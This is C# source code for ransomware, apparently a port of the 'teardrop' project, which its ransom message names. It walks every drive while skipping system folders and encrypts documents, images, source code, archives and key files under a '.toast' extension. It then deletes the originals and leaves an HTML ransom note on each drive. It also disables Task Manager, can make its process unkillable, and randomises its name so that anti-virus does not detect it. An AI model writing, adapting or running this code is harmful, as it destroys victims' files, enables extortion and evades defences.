// See https://aka.ms/new-console-template for more information

using System.Runtime.Versioning;

//var startup = new Startup();
//startup.Main();

internal class Startup
{
    private static string applicationName = string.Empty;
    private static string generatedKey = string.Empty;
    private static readonly bool unkillable = false;
    private static readonly bool debug = true;
    private static readonly string defaultExtension = ".toast";
    private static readonly string defaultMessage = "<h1>Github:</h1><p>hackthedev/teardrop</p>";
    private enum CypherMode
    {
        Encode,
        Decode
    }

    private readonly string[] skipPaths = new[]
    {
            "WinSxS", "Windows",  "System32", "Program Files",
            "Program Files (x86)", "System Volume Information"
        };

    private readonly string[] allowedExtensions = new[]
{
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav",
            ".pdf", ".raw", ".bat", ".json", ".doc", ".txt",
            ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip",
            ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
            ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln",
            ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
            ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa",
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz",
            ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
            ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb",
            "java", ".cpp", ".cert", ".pem"
        };
    public void Main()
    {
        Setup();
    }

    public static void Log(string text, string title)
    {
        try
        {
            if (File.Exists(@".\log.txt"))
            {
                string prefix = $"[{ DateTime.Now}] ";
                File.AppendAllText(@".\log.txt", $"{prefix}{text}{Environment.NewLine}");
            }
        }
        catch { }
    }

    private void Setup()
    {
        GenerateRandomApplicationName();
        GenerateKeys();
        ChangeProcessMode();
        ChangeTaskManagerAccess();
    }

    [SupportedOSPlatform("windows")]
    private void ChangeTaskManagerAccess()
    {
        try
        {
            if (debug)
            {
                MachineMananger.DisableTaskManager();
                return;
            }

            MachineMananger.EnableTaskManager();
        }
        catch (Exception ex)
        {
            Log(ex.Message, "Form1_Load > ChangeTaskManagerAccess");
        }
    }

    private void GenerateKeys()
    {
        // Check if Encryption/Decryption Key was ever created on that machine
        if (generatedKey.Length != 34)
        {
            generatedKey = CryptoManager.GetRandomString(34);

            if (debug == true)
            {
                WriteLine($@"Generated key: {generatedKey}");
            }
        }
        else
        {
            if (debug == true)
            {
                WriteLine($@"Key is: {generatedKey}");
            }
        }
    }

    private void GenerateRandomApplicationName()
    {
        // Check if Application name is already set. If not, generate one
        // This should be random to try to be undetected from Anti-Virus
        if (applicationName.Length != 12)
        {
            applicationName = CryptoManager.GetRandomString(12);

            if (debug == true)
            {
                if (debug == true)
                {
                    WriteLine($@"Generated Application Name: {applicationName}");
                }

                Log($@"Generated Application Name: {applicationName}", "Form1_Load > Generate Application Name");
            }
        }
        else
        {
            if (debug == true)
            {
                WriteLine($@"Application name is: {applicationName}");
            }
        }
    }

    private void ChangeProcessMode()
    {
        if (unkillable)
        {
            ProcessMananger.ProcessUnkillable();
            return;
        }

        ProcessMananger.ProcessKillable();
    }

    public void WriteLine(string text)
    {
        Console.WriteLine($"{text}{Environment.NewLine}");
    }

    private void ChangeAllFiles(string rootPath, CypherMode mode = CypherMode.Encode)
    {
        try
        {
            if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint)
            {
                string newFilePath = string.Empty;
                string defaultKey = generatedKey;

                foreach (string directory in GetValidDirectories(rootPath))
                {
                    foreach (string filePath in Directory.GetFiles(Path.GetFullPath(directory)))
                    {
                        string extension = Path.GetExtension(filePath);

                        switch (mode)
                        {
                            case CypherMode.Encode:
                                if (!IsValidExtension(extension)) break;

                                newFilePath = FileManager.AddExtension(filePath, defaultExtension);

                                CryptoManager.EncodeFile(filePath, newFilePath, defaultKey);

                                WriteLine($@"Encrypted {filePath}");

                                RemoveFile(filePath);
                                break;

                            case CypherMode.Decode:
                                if (!FileManager.HasExtension(filePath, defaultExtension)) break;

                                newFilePath = FileManager.RemoveExtension(filePath, defaultExtension);

                                CryptoManager.DecodeFile(filePath, newFilePath, defaultKey);

                                WriteLine($"Decrypted {filePath}");

                                RemoveFile(filePath);
                                break;

                            default: throw new NotSupportedException();
                        }
                    }

                    ChangeAllFiles(directory);
                }
            }
        }
        catch (Exception e)
        {
            WriteLine(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
        }
    }

    private bool IsValidExtension(string extension)
    {
        return allowedExtensions.Contains(extension.ToLower());
    }

    private IEnumerable<string> GetValidDirectories(string path)
    {
        return Directory.GetDirectories(path).Where(directory => !skipPaths.Contains(directory));
    }

    private void RemoveFile(string filePath)
    {
        try
        {
            File.Delete(filePath);
        }
        catch (Exception ex2)
        {
            WriteLine($"Cant delete file {ex2.Message}");
            Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
        }
    }

    private void ManangeDrives(CypherMode mode)
    {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
            ChangeDrive(drive, mode);
        }
    }

    private void ChangeDrive(DriveInfo drive, CypherMode mode)
    {
        WriteLine($@"Found drive {drive.Name}");
        Log($@"Found drive {drive.Name}", "GetFiles > Drive State Check");

        try
        {
            if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

            ChangeAllFiles(drive.Name);

            FileManager.WriteHtmlFile(drive.Name, defaultMessage);

        }
        catch (Exception ex)
        {
            Log($@"Found drive {drive.Name} , but it's not ready.", "GetFiles > Drive State Check");
            WriteLine($@"Found drive {drive.Name}, but it's not ready.");
            Log($@"More information about the exception: {ex.Message}", "");
        }
    }


    private void BtnDecrypt_Click(object sender, EventArgs e)
    {
        /*if(!string.IsNullOrEmpty(textBoxKey.Text.Trim()))
        {
            ManangeDrives(CypherMode.Decode);
        }*/
        GenerateKeys();
        ChangeAllFiles(@"D:\testDir");
        ChangeAllFiles(@"D:\testDir", CypherMode.Decode);
    }
}